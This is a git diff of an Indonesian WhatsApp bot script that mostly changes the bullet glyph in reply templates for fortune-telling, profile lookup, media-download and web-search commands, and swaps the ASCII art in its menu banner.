-                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Lahir :* ${anu.message.tgl_lahir}\n│➣ *Hasil :* ${anu.message.result}\n│➣ *Info :* ${anu.message.info}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'harinaas': case 'harisial': {
@@ -2163,7 +2163,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hari Naas :* ${anu.message.hari_naas}\n│➳ *Info :* ${anu.message.catatan}\n│➳ *Catatan :* ${anu.message.info}`, m)
+                jobotz.sendText(m.chat, `│➣ *Hari Lahir :* ${anu.message.hari_lahir}\n│➣ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➣ *Hari Naas :* ${anu.message.hari_naas}\n│➣ *Info :* ${anu.message.catatan}\n│➣ *Catatan :* ${anu.message.info}`, m)
             }
             break
             case 'nagahari': case 'harinaga': {
@@ -2172,7 +2172,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Hari Lahir :* ${anu.message.hari_lahir}\n│➣ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➣ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'arahrejeki': case 'arahrezeki': {
@@ -2181,7 +2181,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Arah Rezeki :* ${anu.message.arah_rejeki}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Hari Lahir :* ${anu.message.hari_lahir}\n│➣ *tanggal Lahir :* ${anu.message.tgl_lahir}\n│➣ *Arah Rezeki :* ${anu.message.arah_rejeki}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'peruntungan': {
@@ -2190,7 +2190,7 @@ break
                 let [nama, tgl, bln, thn, untuk] = text.split`,`
                 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nama :* ${anu.message.nama}\n│➣ *Lahir :* ${anu.message.tgl_lahir}\n│➣ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n│➣ *Hasil :* ${anu.message.result}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'weton': case 'wetonjawa': {
@@ -2199,7 +2199,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.weton_jawa(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tanggal}\n│➳ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n│➳ *Watak Hari :* ${anu.message.watak_hari}\n│➳ *Naga Hari :* ${anu.message.naga_hari}\n│➳ *Jam Baik :* ${anu.message.jam_baik}\n│➳ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
+                jobotz.sendText(m.chat, `│➣ *Tanggal :* ${anu.message.tanggal}\n│➣ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n│➣ *Watak Hari :* ${anu.message.watak_hari}\n│➣ *Naga Hari :* ${anu.message.naga_hari}\n│➣ *Jam Baik :* ${anu.message.jam_baik}\n│➣ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
             }
             break
             case 'sifat': case 'karakter': {
@@ -2208,7 +2208,7 @@ break
                 let [nama, tgl, bln, thn] = text.split`,`
                 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nama :* ${anu.message.nama}\n│➣ *Lahir :* ${anu.message.tgl_lahir}\n│➣ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
             }
             break
             case 'keberuntungan': {
@@ -2217,7 +2217,7 @@ break
                 let [nama, tgl, bln, thn] = text.split`,`
                 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nama :* ${anu.message.nama}\n│➣ *Lahir :* ${anu.message.tgl_lahir}\n│➣ *Hasil :* ${anu.message.result}`, m)
             }
             break
             case 'memancing': {
@@ -2226,7 +2226,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tgl_memancing}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Tanggal :* ${anu.message.tgl_memancing}\n│➣ *Hasil :* ${anu.message.result}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'masasubur': {
@@ -2235,7 +2235,7 @@ break
                 let [tgl, bln, thn, siklus] = text.split`,`
                 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Hasil :* ${anu.message.result}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'zodiak': case 'zodiac': {
@@ -2271,7 +2271,7 @@ break
                 
                 let anu = await primbon.zodiak(zodiac)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Zodiak :* ${anu.message.zodiak}\n│➳ *Nomor :* ${anu.message.nomor_keberuntungan}\n│➳ *Aroma :* ${anu.message.aroma_keberuntungan}\n│➳ *Planet :* ${anu.message.planet_yang_mengitari}\n│➳ *Bunga :* ${anu.message.bunga_keberuntungan}\n│➳ *Warna :* ${anu.message.warna_keberuntungan}\n│➳ *Batu :* ${anu.message.batu_keberuntungan}\n│➳ *Elemen :* ${anu.message.elemen_keberuntungan}\n│➳ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Zodiak :* ${anu.message.zodiak}\n│➣ *Nomor :* ${anu.message.nomor_keberuntungan}\n│➣ *Aroma :* ${anu.message.aroma_keberuntungan}\n│➣ *Planet :* ${anu.message.planet_yang_mengitari}\n│➣ *Bunga :* ${anu.message.bunga_keberuntungan}\n│➣ *Warna :* ${anu.message.warna_keberuntungan}\n│➣ *Batu :* ${anu.message.batu_keberuntungan}\n│➣ *Elemen :* ${anu.message.elemen_keberuntungan}\n│➣ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'shio': {
@@ -2279,7 +2279,7 @@ break
                 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                 let anu = await primbon.shio(text)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Hasil :* ${anu.message}`, m)
+                jobotz.sendText(m.chat, `│➣ *Hasil :* ${anu.message}`, m)
             }
             break
 	    case 'stalker': case 'stalk': {
@@ -2322,13 +2322,13 @@ break
                     if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                     let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                     if (anu.status == false) return m.reply(anu.result.message)
-                    jobotz.sendMedia(m.chat, anu.caption.profile_hd, '', `│➳ Full Name : ${anu.caption.full_name}\n│➳ User Name : ${anu.caption.user_name}\n│➳ ID ${anu.caption.user_id}\n│➳ Followers : ${anu.caption.followers}\n│➳ Following : ${anu.caption.following}\n│➳ Bussines : ${anu.caption.bussines}\n│➳ Profesional : ${anu.caption.profesional}\n│➳ Verified : ${anu.caption.verified}\n│➳ Private : ${anu.caption.private}\n│➳ Bio : ${anu.caption.biography}\n│➳ Bio Url : ${anu.caption.bio_url}`, m)
+                    jobotz.sendMedia(m.chat, anu.caption.profile_hd, '', `│➣ Full Name : ${anu.caption.full_name}\n│➣ User Name : ${anu.caption.user_name}\n│➣ ID ${anu.caption.user_id}\n│➣ Followers : ${anu.caption.followers}\n│➣ Following : ${anu.caption.following}\n│➣ Bussines : ${anu.caption.bussines}\n│➣ Profesional : ${anu.caption.profesional}\n│➣ Verified : ${anu.caption.verified}\n│➣ Private : ${anu.caption.private}\n│➣ Bio : ${anu.caption.biography}\n│➣ Bio Url : ${anu.caption.bio_url}`, m)
 		    db.data.users[m.sender].limit -= 1
                 } else if (type.toLowerCase() == 'npm') {
                     if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                     let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                     if (anu.status == false) return m.reply(anu.result.message)
-                    m.reply(`│➳ Name : ${anu.name}\n│➳ Version : ${Object.keys(anu.versions)}\n│➳ Created : ${tanggal(anu.time.created)}\n│➳ Modified : ${tanggal(anu.time.modified)}\n│➳ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n│➳ Description : ${anu.description}\n│➳ Homepage : ${anu.homepage}\n│➳ Keywords : ${anu.keywords}\n│➳ Author : ${anu.author.name}\n│➳ License : ${anu.license}\n│➳ Readme : ${anu.readme}`)
+                    m.reply(`│➣ Name : ${anu.name}\n│➣ Version : ${Object.keys(anu.versions)}\n│➣ Created : ${tanggal(anu.time.created)}\n│➣ Modified : ${tanggal(anu.time.modified)}\n│➣ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n│➣ Description : ${anu.description}\n│➣ Homepage : ${anu.homepage}\n│➣ Keywords : ${anu.keywords}\n│➣ Author : ${anu.author.name}\n│➣ License : ${anu.license}\n│➣ Readme : ${anu.readme}`)
 		    db.data.users[m.sender].limit -= 1
                 } else {
                     m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
@@ -2410,7 +2410,7 @@ break
                 if (!text) throw 'No Query Title'
                 m.reply(mess.wait)
                 let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
-                let msg = await jobotz.sendImage(m.chat, anu.result.img, `│➳ Title : ${anu.result.lagu}\n│➳ Album : ${anu.result.album}\n│➳ Singer : ${anu.result.penyanyi}\n│➳ Publish : ${anu.result.publish}\n│➳ Lirik :\n${anu.result.lirik.result}`, m)
+                let msg = await jobotz.sendImage(m.chat, anu.result.img, `│➣ Title : ${anu.result.lagu}\n│➣ Album : ${anu.result.album}\n│➣ Singer : ${anu.result.penyanyi}\n│➣ Publish : ${anu.result.publish}\n│➣ Lirik :\n${anu.result.lirik.result}`, m)
                 jobotz.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
             }
             break
@@ -2419,7 +2419,7 @@ break
                 if (!text) throw 'No Query Title'
                 m.reply(mess.wait)
                 let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
-                let msg = await jobotz.sendImage(m.chat, anu.result.thumb, `│➳ Title : ${anu.result.title}\n│➳ Url : ${isUrl(text)[0]}`)
+                let msg = await jobotz.sendImage(m.chat, anu.result.thumb, `│➣ Title : ${anu.result.title}\n│➣ Url : ${isUrl(text)[0]}`)
                 jobotz.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
             }
             break
@@ -2465,7 +2465,7 @@ break
                 if (!text) throw 'Masukkan Query Link!'
                 m.reply(mess.wait)
                 let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
-                jobotz.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `│➳ Title : ${anu.result.title}`}, { quoted: m })
+                jobotz.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `│➣ Title : ${anu.result.title}`}, { quoted: m })
             }
             break
 	        case 'pindl': case 'pinterestdl': {
@@ -2489,11 +2489,11 @@ break
 		    let buttonMessage = {
 		        image: { url: anu.author.profilePic },
 			caption: `
-│➳ Title : ${anu.title}
-│➳ Author : ${anu.author.name}
-│➳ Like : ${anu.like}
-│➳ Caption : ${anu.caption}
-│➳ Url : ${anu.media[0]}
+│➣ Title : ${anu.title}
+│➣ Author : ${anu.author.name}
+│➣ Like : ${anu.like}
+│➣ Caption : ${anu.caption}
+│➣ Url : ${anu.media[0]}
 Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
 `,
 			footer: jobotz.user.name,
@@ -2503,7 +2503,7 @@ Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan c
 		    jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
 		} else if (anu.type == 'image') {
 		    anu.media.map(async (url) => {
-		        jobotz.sendMessage(m.chat, { image: { url }, caption: `│➳ Title : ${anu.title}\n│➳ Author : ${anu.author.name}\n│➳ Like : ${anu.like}\n│➳ Caption : ${anu.caption}` }, { quoted: m })
+		        jobotz.sendMessage(m.chat, { image: { url }, caption: `│➣ Title : ${anu.title}\n│➣ Author : ${anu.author.name}\n│➣ Like : ${anu.like}\n│➣ Caption : ${anu.caption}` }, { quoted: m })
 		    })
 		}
 	    }
@@ -2932,12 +2932,12 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             if (!isCreator) return
             if (!text) throw `Example : ${prefix + command} clash of clans`
             let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
-            let teks = `│➳ Playstore Search From : ${text}\n\n`
+            let teks = `│➣ Playstore Search From : ${text}\n\n`
             for (let i of res.result) {
-            teks += `│➳ Name : ${i.name}\n`
-            teks += `│➳ Link : ${i.link}\n`
-            teks += `│➳ Developer : ${i.developer}\n`
-            teks += `│➳ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
+            teks += `│➣ Name : ${i.name}\n`
+            teks += `│➣ Link : ${i.link}\n`
+            teks += `│➣ Developer : ${i.developer}\n`
+            teks += `│➣ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
             }
             m.reply(teks)
             }
@@ -2947,20 +2947,20 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             if (!text) throw `Example : ${prefix + command} samsung`
             let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
             let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
-let capt = `│➳ Title: ${judul}
-│➳ Realease: ${rilis}
-│➳ Size: ${ukuran}
-│➳ Type: ${type}
-│➳ Storage: ${storage}
-│➳ Display: ${display}
-│➳ Inchi: ${inchi}
-│➳ Pixel: ${pixel}
-│➳ Video Pixel: ${videoPixel}
-│➳ Ram: ${ram}
-│➳ Chipset: ${chipset}
-│➳ Battery: ${batrai}
-│➳ Battery Brand: ${merek_batre}
-│➳ Detail: ${detail}`
+let capt = `│➣ Title: ${judul}
+│➣ Realease: ${rilis}
+│➣ Size: ${ukuran}
+│➣ Type: ${type}
+│➣ Storage: ${storage}
+│➣ Display: ${display}
+│➣ Inchi: ${inchi}
+│➣ Pixel: ${pixel}
+│➣ Video Pixel: ${videoPixel}
+│➣ Ram: ${ram}
+│➣ Chipset: ${chipset}
+│➣ Battery: ${batrai}
+│➣ Battery Brand: ${merek_batre}
+│➣ Detail: ${detail}`
             jobotz.sendImage(m.chat, thumb, capt, m)
             }
             break
@@ -2970,9 +2970,9 @@ let capt = `│➳ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
             let capt = `Jadwal Bioskop From : ${text}\n\n`
             for (let i of res.result){
-            capt += `│➳ Title: ${i.title}\n`
-            capt += `│➳ Thumbnail: ${i.thumb}\n`
-            capt += `│➳ Url: ${i.url}\n\n──────────────────────\n`
+            capt += `│➣ Title: ${i.title}\n`
+            capt += `│➣ Thumbnail: ${i.thumb}\n`
+            capt += `│➣ Url: ${i.url}\n\n──────────────────────\n`
             }
             jobotz.sendImage(m.chat, res.result[0].thumb, capt, m)
             }
@@ -2982,9 +2982,9 @@ let capt = `│➳ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
             let capt = `Now Playing Bioskop\n\n`
             for (let i of res.result){
-            capt += `│➳ Title: ${i.title}\n`
-            capt += `│➳ Url: ${i.url}\n`
-            capt += `│➳ Img Url: ${i.img}\n\n──────────────────────\n`
+            capt += `│➣ Title: ${i.title}\n`
+            capt += `│➣ Url: ${i.url}\n`
+            capt += `│➣ Img Url: ${i.img}\n\n──────────────────────\n`
             }
             jobotz.sendImage(m.chat, res.result[0].img, capt, m)
             }
@@ -2995,11 +2995,11 @@ let capt = `│➳ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
             let capt = `Amino Search From : ${text}\n\n`
             for (let i of res.result){
-            capt += `│➳ Community: ${i.community}\n`
-            capt += `│➳ Community Link: ${i.community_link}\n`
-            capt += `│➳ Thumbnail: ${i.community_thumb}\n`
-            capt += `│➳ Description: ${i.community_desc}\n`
-            capt += `│➳ Member Count: ${i.member_count}\n\n──────────────────────\n`
+            capt += `│➣ Community: ${i.community}\n`
+            capt += `│➣ Community Link: ${i.community_link}\n`
+            capt += `│➣ Thumbnail: ${i.community_thumb}\n`
+            capt += `│➣ Description: ${i.community_desc}\n`
+            capt += `│➣ Member Count: ${i.member_count}\n\n──────────────────────\n`
             }
             jobotz.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
             }
@@ -3010,13 +3010,13 @@ let capt = `│➳ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
             let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
             let capt = `Wattpad From ${text}\n\n`
-            capt += `│➳ Judul: ${judul}\n`
-            capt += `│➳ Dibaca: ${dibaca}\n`
-            capt += `│➳ Divote: ${divote}\n`
-            capt += `│➳ Bab: ${bab}\n`
-            capt += `│➳ Waktu: ${waktu}\n`
-            capt += `│➳ Url: ${url}\n`
-            capt += `│➳ Deskripsi: ${description}`
+            capt += `│➣ Judul: ${judul}\n`
+            capt += `│➣ Dibaca: ${dibaca}\n`
+            capt += `│➣ Divote: ${divote}\n`
+            capt += `│➣ Bab: ${bab}\n`
+            capt += `│➣ Waktu: ${waktu}\n`
+            capt += `│➣ Url: ${url}\n`
+            capt += `│➣ Deskripsi: ${description}`
             jobotz.sendImage(m.chat, thumb, capt, m)
             }
             break
@@ -3025,11 +3025,11 @@ let capt = `│➳ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
             let capt = `Webtoons Search From : ${text}\n\n`
             for (let i of res.result) {
-            capt += `│➳ Judul: ${i.judul}\n`
-            capt += `│➳ Like: ${i.like}\n`
-            capt += `│➳ Creator: ${i.creator}\n`
-            capt += `│➳ Genre: ${i.genre}\n`
-            capt += `│➳ Url: ${i.url}\n\n──────────────────────\n`
+            capt += `│➣ Judul: ${i.judul}\n`
+            capt += `│➣ Like: ${i.like}\n`
+            capt += `│➣ Creator: ${i.creator}\n`
+            capt += `│➣ Genre: ${i.genre}\n`
+            capt += `│➣ Url: ${i.url}\n\n──────────────────────\n`
             }
             m.reply(capt)
             }
@@ -3040,11 +3040,11 @@ let capt = `│➳ Title: ${judul}
             let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
             let capt = `Drakor Search From : ${text}\n\n`
             for (let i of res.result) {
-            capt += `│➳ Judul: ${i.judul}\n`
-            capt += `│➳ Years: ${i.years}\n`
-            capt += `│➳ Genre: ${i.genre}\n`
-            capt += `│➳ Url: ${i.url}\n`
-            capt += `│➳ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
+            capt += `│➣ Judul: ${i.judul}\n`
+            capt += `│➣ Years: ${i.years}\n`
+            capt += `│➣ Genre: ${i.genre}\n`
+            capt += `│➣ Url: ${i.url}\n`
+            capt += `│➣ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
             }
             jobotz.sendImage(m.chat, res.result[0].thumbnail, capt, m)
             }
@@ -3095,23 +3095,13 @@ let capt = `│➳ Title: ${judul}
 case 'menu': case 'menuiky': case 'menubotiky': { 
 jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky.mp3'), mimetype: 'audio/mpeg', ptt:true })
  menunya = `
-██▀░░░░░░░░░░░░░▀██
-█│░░░░░░░░░░░░░░░│█
-▌│░░░░░░░░░░░░░░░│▐
-░└┐░░░░░░░░░░░░░┌┘░
-░░└┐░░░░░░░░░░░┌┘░░
-░░┌┘▄▄▄░░░░░▄▄▄└┐░░
-▌░│████▌░░░▐████│░▐
-█░│▐██▀░░▄░░▀██▌│░█
-█▌┘░░░░░▐█▌░░░░░└▐█
-██░░▄▄▓░▀█▀░▓▄▄░░██
-██▄─┘█▌░░░░░▐█└─▄██
-███░░▐─┬┬┬┬┬─▌░░███
-███▌░░┬┼┼┼┼┼┬░░▐███
-████▄░└┴┴┴┴┴┘░▄████
-█████▄░░░░░░░▄█████
-▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
-▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+▇◤▔▔▔▔▔▔▔◥▇
+▇▏◥▇◣┊◢▇◤▕▇
+▇▏▃▆▅▎▅▆▃▕▇
+▇▏╱▔▕▎▔▔╲▕▇
+▇◣◣▃▅▎▅▃◢◢▇
+▇▇◣◥▅▅▅◤◢▇▇
+▇▇▇◣╲▇╱◢▇▇▇ 
 ▰▱▰▱▰▱▰▱▰▱▰▱▰
 ╭─────────────────╮
 │      ◪〘 MENU BOT 〙◪
@@ -3374,327 +3364,327 @@ break
 │    ◪〘 GRUP MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
-│➳ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➳ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
-│➳ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➳ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➳ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
-│➳ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
-│➳ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
-│➳ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
-│➳ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
-│➳ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
+│➣ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
+│➣ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
+│➣ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
+│➣ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
+│➣ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
+│➣ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
+│➣ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
+│➣ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘WEBZONE MENU〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
-│➳ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
-│➳ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
-│➳ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
-│➳ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
-│➳ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
-│➳ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
-│➳ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
+│➣ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
+│➣ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
+│➣ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
